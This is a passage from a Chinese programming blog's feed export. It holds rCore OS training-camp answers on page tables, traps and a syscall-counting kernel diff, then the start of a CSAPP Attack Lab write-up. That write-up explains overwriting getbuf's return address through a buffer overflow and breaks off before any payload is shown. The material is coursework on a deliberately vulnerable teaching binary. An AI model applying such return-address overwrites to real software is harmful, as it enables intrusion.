class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">            time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span><span class="token prefix unchanged"> </span><span class="token line">        // prepare TrapContext in user space</span><span class="token prefix unchanged"> </span><span class="token line">        let trap_cx = task_control_block.get_trap_cx();</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p><strong>Q:</strong> 请列举 SV39 页表页表项的组成，描述其中的标志位有何作用？</p><p><strong>A:</strong> </p><p><img src="/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/pte.png" alt></p><p>上图为 SV39 分页模式下的页表项，其中 <code>[53:10]</code> 这 44 位是物理页号，最低的 8 位 <code>[7:0]</code> 则是标志位，它们的含义如下：</p><ul><li>仅当 V(Valid) 位为 1 时，页表项才是合法的；</li><li>R/W/X 分别控制索引到这个页表项的对应虚拟页面是否允许读/写/取指；</li><li>U 控制索引到这个页表项的对应虚拟页面是否在 CPU 处于 U 特权级的情况下是否被允许访问；</li><li>G 代表全局属性，当 G 被设置为 1 时，表示该页表项所描述的页面是全局共享的；</li><li>A(Accessed) 记录自从页表项上的这一位被清零之后，页表项的对应虚拟页面是否被访问过；</li><li>D(Dirty) 则记录自从页表项上的这一位被清零之后，页表项的对应虚拟页表是否被修改过。</li></ul><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p>缺页指的是进程访问页面时页面不在页表中或在页表中无效的现象，此时 MMU 将会返回一个中断， 告知 os 进程内存访问出了问题。os 选择填补页表并重新执行异常指令或者杀死进程。</p><p><strong>Q1:</strong> 请问哪些异常可能是缺页导致的？</p><p><strong>A1:</strong> 进程访问未映射的内存页面、访问已被换出到磁盘的页面、进程尝试以不正确的权限访问页面（例如写入只读页面）。</p><p><strong>Q2:</strong> 发生缺页时，描述相关重要寄存器的值，上次实验描述过的可以简略。</p><p><strong>A2:</strong> 以下是与缺页相关的 CSR 寄存器的值：</p><ul><li><code>scause</code>: 记录导致异常的原因。对于缺页异常，该寄存器的值包含异常的类型和特定的错误代码，指示发生了缺页异常。</li><li><code>sstatus</code>: 记录处理器当前状态，其中 SPP 段记录当前特权等级。</li><li><code>sepc</code>: 当缺页异常发生时，<code>sepc</code> 会保存出错指令的地址，以便在异常处理完成后能够返回到该指令重新执行。</li><li><code>stval</code>: 在缺页异常情况下，<code>stval</code> 会存储导致缺页的虚拟地址，帮助操作系统确定是哪个页面缺失。</li></ul><p>缺页有两个常见的原因，其一是 Lazy 策略，也就是直到内存页面被访问才实际进行页表操作。 比如，一个程序被执行时，进程的代码段理论上需要从磁盘加载到内存。但是 os 并不会马上这样做， 而是会保存 <code>.text</code> 段在磁盘的位置信息，在这些代码第一次被执行时才完成从磁盘的加载操作。</p><p><strong>Q3:</strong> 这样做有哪些好处？</p><p><strong>A3:</strong> 只在需要时加载页面，避免不必要的内存占用，允许系统将更多进程同时驻留在内存中；程序在启动时不必立即加载所有代码和数据，从而减少初始加载时间。</p><p>其实，我们的 mmap 也可以采取 Lazy 策略，比如：一个用户进程先后申请了 10G 的内存空间， 然后用了其中 1M 就直接退出了。按照现在的做法，我们显然亏大了，进行了很多没有意义的页表操作。</p><p><strong>Q4:</strong> 处理 10G 连续的内存页面，对应的 SV39 页表大致占用多少内存 (估算数量级即可)？</p><p><strong>A4:</strong> 略。</p><p><strong>Q5:</strong> 请简单思考如何才能实现 Lazy 策略，缺页时又如何处理？描述合理即可，不需要考虑实现。</p><p><strong>A5:</strong> 加载程序时并不真正将代码段加载到内存，将页表项的有效位设置为 0，访问该代码段时会触发缺页异常，进入内核后得知异常原因是访问 Lazy 页面，随后进行异常处理：将页面从磁盘加载入内存，随后返回用户态重新执行。</p><p>缺页的另一个常见原因是 swap 策略，也就是内存页面可能被换到磁盘上了，导致对应页面失效。</p><p><strong>Q6:</strong> 此时页面失效如何表现在页表项(PTE)上？</p><p><strong>A6:</strong> 有效位为 0.</p><h2 id="t3"><a href="#t3" class="headerlink" title="t3"></a>t3</h2><p>为了防范侧信道攻击，我们的 os 使用了双页表。但是传统的设计一直是单页表的，也就是说， 用户线程和对应的内核线程共用同一张页表，只不过内核对应的地址只允许在内核态访问。 (备注：这里的单/双的说法仅为自创的通俗说法，并无这个名词概念，详情见 <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">KPTI</a> )</p><p><strong>Q1:</strong> 在单页表情况下，如何更换页表？</p><p><strong>A1:</strong> 无需更换，通过标志位进行控制，可能需要将 TLB 清空。</p><p><strong>Q2:</strong> 单页表情况下，如何控制用户态无法访问内核页面？（tips:看看上一题最后一问）</p><p><strong>A2:</strong> 将内核页面的 U 标志位设置为 0.</p><p><strong>Q3:</strong> 单页表有何优势？（回答合理即可）</p><p><strong>A3:</strong> 不需要跳板代码进行用户态和内核态的切换，内核态和用户态切换的速度更快。</p><p><strong>Q4:</strong> 双页表实现下，何时需要更换页表？假设你写一个单页表操作系统，你会选择何时更换页表（回答合理即可）？</p><p><strong>A4:</strong> 双页表实现下，用户态和内核态切换、不同进程切换时需要更换页表。对于单页表操作系统，不同用户线程切换时需要更换页表。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter3练习</title>
    <link href="http://lordaeronesz.github.io/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/</id>
    <published>2024-10-28T15:30:11.000Z</published>
    <updated>2024-11-04T11:42:46.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>rCore 的第一个实验，主要是为了熟悉如何进行内核编程，实现起来比较简单。</p><p>要求实现一个系统调用，填充传入的 <code>TaskInfo</code> 结构体已获取当前任务的一些信息，包含三个字段：任务状态、任务使用的系统调用及调用次数、系统调用时刻距离任务第一次被调度时刻的时长（单位 ms）。</p><p>首先是任务状态，这个比较简单，直接查看当前任务的任务控制块的字段值即可。</p><p>对于系统调用次数，可以在任务控制块中添加新的字段来存储相关信息，例如按提示所说，一个长度为 <code>MAX_SYSCALL_NUM</code> 的整型数组。在函数 <code>syscall/mod.rs:syscall</code> 中，在内核对用户态传入的系统调用号进行分发处理前，增加对应的系统调用桶的计数。注意，由于本次系统调用 <code>sys_task_info</code> 也要进行计数，因此不能在执行了特定的系统调用后再来增加计数，否则本次 <code>sys_task_info</code> 系统调用次数将无法被统计。</p><p>最后是距离任务第一次被调度时刻的时长，一种实现方式是：为任务控制块添加新的字段：<code>time</code>，表示任务第一次被调度的时间。先为 <code>time</code> 设定一个初始值（例如 0），表示该值未被更改过，每当一个任务即将被调度时（如 <code>TASK_MANAGER.run_next_task()</code> 进行任务切换时），查看 <code>time</code> 值，判断是否未被更改：如果是，则赋予当前时间；否则，不做任何操作。这样，就成功保存了任务初次被调度的时刻。在调用 <code>sys_task_info</code> 时，将当前时间减去保存的初次被调度时间，即为时长，注意单位为毫秒。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>由于代码是直接在原项目代码的基础上进行修改，因此为了查看方便，本次及之后实验的代码将以 <code>git diff</code> 的形式展现，加号（绿色）代表添加的代码，减号（红色）代表删除的代码。</p><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex e6e8f98..7f63ed6 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -26,8 +26,13 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::inc_syscall_times;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // increase syscall times before handle specific syscall</span><span class="token prefix inserted">+</span><span class="token line">    inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_EXIT => sys_exit(args[0] as i32),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex f1cd424..8d01cf4 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,8 +1,9 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    task::&#123;exit_current_and_run_next, suspend_current_and_run_next, TaskStatus&#125;,</span><span class="token prefix deleted">-</span><span class="token line">    timer::get_time_us,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    task::&#123;exit_current_and_run_next, get_current_tcb, suspend_current_and_run_next, TaskStatus&#125;,</span><span class="token prefix inserted">+</span><span class="token line">    timer::&#123;get_time_ms, get_time_us&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -53,5 +54,19 @@ pub fn sys_get_time(ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_task_info");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let cur_tcb = get_current_tcb();</span><span class="token prefix inserted">+</span><span class="token line">    // labour in vain! The status must be Running</span><span class="token prefix inserted">+</span><span class="token line">    let status = cur_tcb.task_status;</span><span class="token prefix inserted">+</span><span class="token line">    let syscall_times = cur_tcb.syscall_times;</span><span class="token prefix inserted">+</span><span class="token line">    let time = get_time_ms() - cur_tcb.time;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">        *_ti = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">            status,</span><span class="token prefix inserted">+</span><span class="token line">            syscall_times,</span><span class="token prefix inserted">+</span><span class="token line">            time,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/mod.rs b/os/src/task/mod.rsindex c1636ef..4a14e2f 100644<span class="token coord">--- a/os/src/task/mod.rs</span><span class="token coord">+++ b/os/src/task/mod.rs</span>@@ -14,9 +14,11 @@ mod switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(clippy::module_inception)]</span><span class="token prefix unchanged"> </span><span class="token line">mod task;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MAX_APP_NUM;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MAX_APP_NUM, MAX_SYSCALL_NUM&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::loader::&#123;get_num_app, init_app_cx&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span><span class="token prefix unchanged"> </span><span class="token line">use switch::__switch;</span><span class="token prefix unchanged"> </span><span class="token line">pub use task::&#123;TaskControlBlock, TaskStatus&#125;;</span></span>@@ -54,6 +56,8 @@ lazy_static! &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let mut tasks = [TaskControlBlock &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            task_cx: TaskContext::zero_init(),</span><span class="token prefix unchanged"> </span><span class="token line">            task_status: TaskStatus::UnInit,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">            time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;; MAX_APP_NUM];</span><span class="token prefix unchanged"> </span><span class="token line">        for (i, task) in tasks.iter_mut().enumerate() &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            task.task_cx = TaskContext::goto_restore(init_app_cx(i));</span></span>@@ -122,6 +126,11 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut inner = self.inner.exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let current = inner.current_task;</span><span class="token prefix unchanged"> </span><span class="token line">            inner.tasks[next].task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if inner.tasks[next].time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                inner.tasks[next].time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.current_task = next;</span><span class="token prefix unchanged"> </span><span class="token line">            let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;</span></span>@@ -135,6 +144,24 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            panic!("All applications completed!");</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task control block</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_current_tcb(&amp;self) -> TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Run the first task in task list.</span></span>@@ -169,3 +196,13 @@ pub fn exit_current_and_run_next() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    mark_current_exited();</span><span class="token prefix unchanged"> </span><span class="token line">    run_next_task();</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task control block</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_current_tcb() -> TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_current_tcb()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn inc_syscall_times(syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.inc_syscall_times(syscall_id)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/os/src/task/task.rs b/os/src/task/task.rsindex e6580c9..4e4c19b 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,6 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::MAX_SYSCALL_NUM;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The task control block (TCB) of a task.</span><span class="token prefix unchanged"> </span><span class="token line">#[derive(Copy, Clone)]</span></span>@@ -9,6 +10,10 @@ pub struct TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub task_status: TaskStatus,</span><span class="token prefix unchanged"> </span><span class="token line">    /// The task context</span><span class="token prefix unchanged"> </span><span class="token line">    pub task_cx: TaskContext,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The status of a task</span></span></code></pre><blockquote><p><code>time</code> 的设置有一点小 bug，就是第一个被调度任务的 <code>time</code> 应该在 <code>run_first_task</code> 中设置，否则它的 <code>time</code> 将会晚一个调度周期，testcase 没测出来。。。写博客时才注意到，懒得改了😓</p></blockquote><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p><strong>Q:</strong> 正确进入 U 态后，程序的特征还应有：使用 S 态特权指令，访问 S 态寄存器后会报错。 请同学们可以自行测试这些内容（运行 <a href="https://github.com/LearningOS/rCore-Tutorial-Test-2024A/tree/master/src/bin">三个 bad 测例 (ch2b<em>bad</em>*.rs)</a> ）， 描述程序出错行为，同时注意注明你使用的 sbi 及其版本。</p><p><strong>A:</strong> 略。</p><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p>深入理解 <a href="https://github.com/LearningOS/rCore-Tutorial-Code-2024A/blob/ch3/os/src/trap/trap.S">trap.S</a> 中两个函数 <code>__alltraps</code> 和 <code>__restore</code> 的作用，并回答如下问题：</p><p><strong>Q1:</strong> L40：刚进入 <code>__restore</code> 时，<code>a0</code> 代表了什么值。请指出 <code>__restore</code> 的两种使用情景。</p><p><strong>A1:</strong> <code>a0</code> 代表了内核栈的栈指针，即 <code>__alltraps</code> 保存的上下文的首地址。</p><p>情景一：表示内核第一次从内核态切换到用户态（或者说将 CPU 所有权转交给用户程序），在初始化或加载应用程序时，内核通过 <code>__restore</code> 恢复必要的状态。</p><p>情景二：当 <code>call trap_handler</code> 执行结束后，程序计数器指向它的下一条指令，即 <code>__restore</code> 的起始地址，表示 Trap 处理完成，将恢复 Trap 时的上下文状态，返回用户态。</p><p><strong>Q2:</strong> L43-L48：这几行汇编代码特殊处理了哪些寄存器？这些寄存器的的值对于进入用户态有何意义？请分别解释。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">ld t0, 32*8(sp)ld t1, 33*8(sp)ld t2, 2*8(sp)csrw sstatus, t0csrw sepc, t1csrw sscratch, t2</code></pre><p><strong>A2:</strong> 特殊处理了 <code>t0</code>、<code>t1</code>、<code>t2</code>、<code>sstatus</code>、<code>sepc</code>、<code>sscratch</code> 寄存器。</p><p><code>t0</code>、<code>t1</code>、<code>t2</code> 用来暂存从内核栈中读取的之前保存的 CSR 寄存器的值，再使用 <code>csrw</code> 指令将暂存值写入对应的 CSR 寄存器中。</p><p>其中 <code>sstatus</code> 的 <code>SPP</code> 字段给出 Trap 发生之前 CPU 处在哪个特权级等信息，<code>sepc</code> 当 Trap 是异常时（exception）记录之前执行的最后一条指令地址，<code>sscratch</code> 则存储着用户栈的栈指针，用于在 <code>sret</code> 返回用户态前使用 <code>csrrw</code> 指令将当前栈指针从内核栈切换到用户栈。</p><p><strong>Q3:</strong> L50-L56：为何跳过了 <code>x2</code> 和 <code>x4</code>？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">ld x1, 1*8(sp)ld x3, 3*8(sp).set n, 5.rept 27   LOAD_GP %n   .set n, n+1.endr</code></pre><p><strong>A3:</strong> 如下图所示，<code>x2</code> 即 <code>sp</code> 寄存器，保存了内核栈的栈指针。而 <code>x4</code> 寄存器为线程寄存器，在本实验中不会用到。</p><p><img src="/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/reg.png" alt></p><p><strong>Q4:</strong> L60：该指令之后，<code>sp</code> 和 <code>sscratch</code> 中的值分别有什么意义？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">csrrw sp, sscratch, sp</code></pre><p><strong>A4:</strong> 该指令的作用是先将 <code>sscratch</code> 的值读取到 <code>sp</code> 中，再将 <code>sp</code> 的值写入 <code>sscratch</code> 中，这两个操作是在同一周期内完成的，无需中间寄存器的参与，作用相当于 <code>swap(sp, sscratch)</code>. 在返回用户态之前交换 <code>sp</code> 和 <code>sscratch</code> 的值，即将当前栈指针由用户栈切换到内核栈。</p><p><strong>Q5:</strong> <code>__restore</code>：中发生状态切换在哪一条指令？为何该指令执行之后会进入用户态？</p><p><strong>A5:</strong> 状态切换发生在 <code>sret</code>，该指令会负责从栈中恢复之前保存的程序计数器值，并更新特权级相关的寄存器（如 <code>mstatus</code>）。</p><p><strong>Q6:</strong> L13：该指令之后，<code>sp</code> 和 <code>sscratch</code> 中的值分别有什么意义？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">csrrw sp, sscratch, sp</code></pre><p><strong>A6:</strong> 与 L60 相反，作用是将当前栈指针由内核栈切换到用户栈，便于后续的 Trap 处理。</p><p><strong>Q7:</strong> 从 U 态进入 S 态是哪一条指令发生的？</p><p><strong>A7:</strong> 根据 Trap 的类型不同而定。对于系统调用而言，是 <code>ecall</code> 指令，对于其它的异常情况（如非法操作、页面缺失等）则是在硬件检测到后自动触发异常，从而进入内核态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Attack Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/</id>
    <published>2024-09-25T03:45:11.000Z</published>
    <updated>2024-09-25T09:32:48.895Z</updated>
    
    <content type="html"><![CDATA[<p>个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 <strong>缓冲区溢出漏洞</strong> 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。</p><span id="more"></span><p>这个 Lab 上手便给了我当头一棒，在环境配置上琢磨了好一阵。直接运行 <code>./ctarget -q</code> ，程序没有让进行输入，而是直接触发了段错误，后来尝试在跑在学校的 Linux 服务器上得以正常运行，原因不明，推测是 WSL 的锅？？</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/err.png" alt></p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>在倒腾好环境之后，终于可以开始着手完成实验了。</p><p>phase_1 要求我们在调用 <code>getbuf</code> 读取标准输入后，不返回到 <code>test</code> 函数接着执行 <code>printf</code>，而是转而执行 <code>touch1</code>.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以利用书中 3.10.3 节提到的知识，向缓冲区中写入过量的数据，大到足以覆盖掉调用 <code>getbuf</code> 时压入栈中的返回地址，将其修改为我们想要跳转执行的程序的起始地址，即可达成目的。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:  4017a8:48 83 ec 28          sub    $0x28,%rsp  4017ac:48 89 e7             mov    %rsp,%rdi  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;  4017b4:b8 01 00 00 00       mov    $0x1,%eax  4017b9:48 83 c4 28          add    $0x28,%rsp  4017bd:c3                   retq     4017be:90                   nop  4017bf:90                   nop</code></pre><p>观察上述函数 <code>getbuf</code> 的汇编代码，从第一条指令 <code>sub  